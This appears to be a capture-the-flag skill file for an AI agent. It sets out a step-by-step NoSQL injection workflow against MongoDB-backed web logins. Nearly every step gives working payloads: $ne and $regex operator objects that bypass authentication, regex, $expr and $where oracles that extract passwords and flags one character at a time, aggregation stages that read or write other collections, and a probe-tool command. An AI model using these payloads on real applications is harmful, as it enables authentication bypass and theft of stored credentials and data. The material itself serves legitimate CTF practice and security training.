# Workflow — the detection → extraction order

## Step 1 — the recon — is the value an object?

```text
POST /login {"user": "x", "pass": "y"}   — does it accept JSON?
POST /login user[$ne]=x&pass[$ne]=x      — does qs parse it?
```

`injection-points.md` — the carrier check.

## Step 2 — the object-vs-scalar differential

```text
control:  {"user": "nosuch", "pass": "x"}       → 401
probe:    {"user": {"$ne": null}, "pass": {"$ne": null}} → 200?
```

`detection.md` — the object-filter confirmation.

## Step 3 — the `nosqli_probe` — the operator-matrix

```bash
python3 tools/web/nosqli_probe.py --url "http://t/login" --json \
  --user-field user --pass-field pass \
  --good-user "test" --good-pass "test"
```

`nosqli_probe` — the operator matrix — `tooling.md`.

## Step 4 — the auth-bypass — `{"$ne": null}` / `{"$gt": ""}` / `{"$regex": ".*"}`

```text
{"user": {"$ne": null}, "pass": {"$ne": null}}   — any user
{"user": "admin", "pass": {"$ne": null}}         — targeted
{"user": {"$regex": "^admin"}, "pass": {"$ne": null}}  — partial
```

`auth-bypass.md`.

## Step 5 — the extraction — `$regex`/`$gt`/`$where`/`$expr` oracle

```text
{"user": "admin", "pass": {"$regex": "^a"}}      — char-by-char
{"pass": {"$regex": "^.{20}$"}}                  — length
{"admin": {"$exists": true}}                     — field-discovery
{"$expr": {"$regexMatch": {"input": "$pass", "regex": "^a"}}}  — $expr
{"user": {"$where": "this.pass[0] == 'f'"}}      — $where (if enableJs)
```

`extraction.md`.

## Step 6 — the aggregation — the array body

```text
POST /api/search [{"$unionWith": "flag"}]    — the cross-collection
POST /api/search [{"$lookup": {...}}]         — the join
POST /api/search [{"$out": "stolen"}]         — the write
```

`aggregation.md`.

## Step 7 — the flag — the field-extraction

```text
{"flag": {"$regex": "^flag\\{"}}    — the flag-prefix
{"flag": {"$regex": "^flag\\{a"}}   — char-by-char
{"$expr": {"$eq": [{"$substrCP": ["$flag", 0, 4]}, "flag"]}}
```

`extraction.md` — the flag-field walk.

## Step 8 — the flag-record — the verbatim

```bash
python3 tools/hooks.py pre-flag <name> --value "flag{...}" \
  --source "response" --evidence "<the verbatim excerpt>"
```

`evidence-rules.md`.

## The budget — 5 probes / 15 min

`AGENTS.md` — the escalation order — `workflow-deep.md`.

## The routing — the siblings

`skills/web-sqli/` — SQL string-injection — different class.
`skills/web-prototype-pollution/` — `__proto__`/`constructor` pollution —
different class — the `$`-operator is NoSQLi, the `__proto__` is
pollution.
